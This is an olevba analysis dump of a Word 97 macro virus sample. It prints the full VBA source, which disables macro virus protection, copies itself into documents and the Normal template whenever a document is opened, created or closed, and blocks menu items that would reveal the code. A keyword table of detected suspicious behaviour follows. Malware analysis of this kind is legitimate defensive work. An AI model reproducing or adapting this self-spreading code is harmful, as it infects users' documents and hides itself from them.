olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Killer-5ac9b0acb8a3089bcfb4b32ffab993361df60ea4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Killer-5ac9b0acb8a3089bcfb4b32ffab993361df60ea4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SLOTNEW.bas 
in file: Virus.MSWord.Killer-5ac9b0acb8a3089bcfb4b32ffab993361df60ea4 - OLE stream: 'Macros/VBA/SLOTNEW'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub autoopen()
On Error Resume Next
   
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "SLOTNEW" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "SLOTNEW" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="SLOTNEW", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="SLOTNEW", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
End If

On Error Resume Next
file$ = WordBasic.[FileName$]()
Application.OrganizerCopy Source:=file$, Destination:="normal.dot", Name:="SLOTNEW", Object:=wdOrganizerObjectProjectItems


WordBasic.FileSaveAs Format:=1
file$ = WordBasic.[FileName$]()
On Error Resume Next
Application.OrganizerCopy Source:="normal.dot", Destination:=file$, Name:="SLOTNEW", Object:=wdOrganizerObjectProjectItems

WordBasic.FileSaveAs Format:=1
file$ = WordBasic.[FileName$](1)
On Error Resume Next
Application.OrganizerCopy Source:="normal.dot", Destination:=file$, Name:="SLOTNEW", Object:=wdOrganizerObjectProjectItems
 
WordBasic.FileSaveAs Format:=1
file$ = WordBasic.[FileName$](2)
On Error Resume Next
Application.OrganizerCopy Source:="normal.dot", Destination:=file$, Name:="SLOTNEW", Object:=wdOrganizerObjectProjectItems

WordBasic.call "slots"

exit_:

End Sub

Sub slots()
ReDim gdh__(2)
Dim k
Dim NM$
Dim G
Dim ANS$
WordBasic.DisableInput 1
 
On Error Resume Next
If WordBasic.Day(WordBasic.Now()) <> WordBasic.Int(Rnd() * 30) Then GoTo exit_

slotgame:
On Error Resume Next
Err.Number = 0
k = -1
NM$ = ""
G = 0
While k = -1
For G = 0 To 2
gdh__(G) = WordBasic.Int(Rnd() * 10)
If G = 2 Then
NM$ = NM$ + Str(gdh__(2))
GoTo SS
End If
NM$ = NM$ + Str(gdh__(G))
Next G

SS:
WordBasic.Beep

WordBasic.MsgBox "Today is " + WordBasic.[Date$]() + " , let's play a SLOTS game." + Chr(13) + _
"Try your luck! Your lucky numbers are. . . " + Chr(13) + _
NM$ + " ", "Macro Slot Game for Word97"
If NM$ = Str(gdh__(G)) + Str(gdh__(G)) + Str(gdh__(G)) Then
WordBasic.Beep

lucky7:
WordBasic.MsgBox "Bingo ! You win .", _
"Macro Slot Game for Word97"
WordBasic.FileNewDefault
WordBasic.CenterPara
WordBasic.FormatFont , Points:=64, Color:=2, Bold:=1, Underline:=1
WordBasic.Insert "Hmmmm! Maybe next time...."
GoTo exit_

Else
WordBasic.Beep
On Error GoTo -1: On Error GoTo slotgame
Err.Number = 0
ANS$ = WordBasic.[InputBox$]("Try to input the password or play again!", _
"Macro Slot Game for Word97")
WordBasic.Beep
If ANS$ = "Lucky777" Then GoTo lucky Else GoTo try
End If

try:
On Error Resume Next
Err.Number = 0
WordBasic.MsgBox "Hey ! You can't do that. You must input the right numbers or push the cancel button.", _
"Macro Slot Game for Word97"
GoTo slotgame
Wend


lucky:

On Error Resume Next
WordBasic.MsgBox "OK ! ", _
"Macro Slot Game for Word97"
WordBasic.FileNewDefault
WordBasic.CenterPara
WordBasic.FormatFont , Points:=64, Color:=2, Bold:=1, Underline:=1
WordBasic.Insert "Hmmmm........................"

exit_:
End Sub
Sub FileTemplates()
Attribute FileTemplates.VB_ProcData.VB_Invoke_Func = "Normal.SLOT.FileTemplates"
On Error Resume Next
With Assistant.NewBalloon
 .BalloonType = msoBalloonTypeBullets
 .Icon = msoIconTip
 .Button = msoButtonSetOkCancel
 .Heading = "Warning!!"
 .Text = "That option is not installed, please install the HELP files to continue"
 .Button = msoButtonSetOK
 .Show
End With
End Sub
Sub toolsmacro()
On Error Resume Next
With Assistant.NewBalloon
 .BalloonType = msoBalloonTypeBullets
 .Icon = msoIconTip
 .Button = msoButtonSetOkCancel
 .Heading = "Warning!!"
 .Text = "That option is not installed, please install the HELP files to continue"
 .Button = msoButtonSetOK
 .Show
End With
End Sub
Sub autonew()
On Error Resume Next
  
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "SLOTNEW" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "SLOTNEW" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="SLOTNEW", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="SLOTNEW", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
End If

On Error Resume Next
file$ = WordBasic.[FileName$]()
Application.OrganizerCopy Source:=file$, Destination:="normal.dot", Name:="SLOTNEW", Object:=wdOrganizerObjectProjectItems


WordBasic.FileSaveAs Format:=1
file$ = WordBasic.[FileName$]()
On Error Resume Next
Application.OrganizerCopy Source:="normal.dot", Destination:=file$, Name:="SLOTNEW", Object:=wdOrganizerObjectProjectItems

WordBasic.FileSaveAs Format:=1
file$ = WordBasic.[FileName$](1)
On Error Resume Next
Application.OrganizerCopy Source:="normal.dot", Destination:=file$, Name:="SLOTNEW", Object:=wdOrganizerObjectProjectItems
 
WordBasic.FileSaveAs Format:=1
file$ = WordBasic.[FileName$](2)
On Error Resume Next
Application.OrganizerCopy Source:="normal.dot", Destination:=file$, Name:="SLOTNEW", Object:=wdOrganizerObjectProjectItems

WordBasic.call "slots"

exit_:


End Sub
Sub autoclose()
On Error Resume Next
    
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "SLOTNEW" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "SLOTNEW" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="SLOTNEW", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="SLOTNEW", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
End If

On Error Resume Next
file$ = WordBasic.[FileName$]()
Application.OrganizerCopy Source:=file$, Destination:="normal.dot", Name:="SLOTNEW", Object:=wdOrganizerObjectProjectItems


WordBasic.FileSaveAs Format:=1
file$ = WordBasic.[FileName$]()
On Error Resume Next
Application.OrganizerCopy Source:="normal.dot", Destination:=file$, Name:="SLOTNEW", Object:=wdOrganizerObjectProjectItems

WordBasic.FileSaveAs Format:=1
file$ = WordBasic.[FileName$](1)
On Error Resume Next
Application.OrganizerCopy Source:="normal.dot", Destination:=file$, Name:="SLOTNEW", Object:=wdOrganizerObjectProjectItems
 
WordBasic.FileSaveAs Format:=1
file$ = WordBasic.[FileName$](2)
On Error Resume Next
Application.OrganizerCopy Source:="normal.dot", Destination:=file$, Name:="SLOTNEW", Object:=wdOrganizerObjectProjectItems

WordBasic.call "slots"

exit_:

End Sub
Sub ViewVBcode()
On Error Resume Next
With Assistant.NewBalloon
 .BalloonType = msoBalloonTypeBullets
 .Icon = msoIconTip
 .Button = msoButtonSetOkCancel
 .Heading = "Warning!!"
 .Text = "That option is not installed, please install the HELP files to continue"
 .Button = msoButtonSetOK
 .Show
End With
End Sub
Sub toolsoptions()
On Error Resume Next
With Assistant.NewBalloon
 .BalloonType = msoBalloonTypeBullets
 .Icon = msoIconTip
 .Button = msoButtonSetOkCancel
 .Heading = "Warning!!"
 .Text = "That option is not installed, please install the HELP files to continue"
 .Button = msoButtonSetOK
 .Show
End With
End Sub
Sub Toolscustomize()
On Error Resume Next
With Assistant.NewBalloon
 .BalloonType = msoBalloonTypeBullets
 .Icon = msoIconTip
 .Button = msoButtonSetOkCancel
 .Heading = "Warning!!"
 .Text = "That option is not installed, please install the HELP files to continue"
 .Button = msoButtonSetOK
 .Show
End With
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|AutoExec  |autonew             |Runs when a new Word document is created     |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

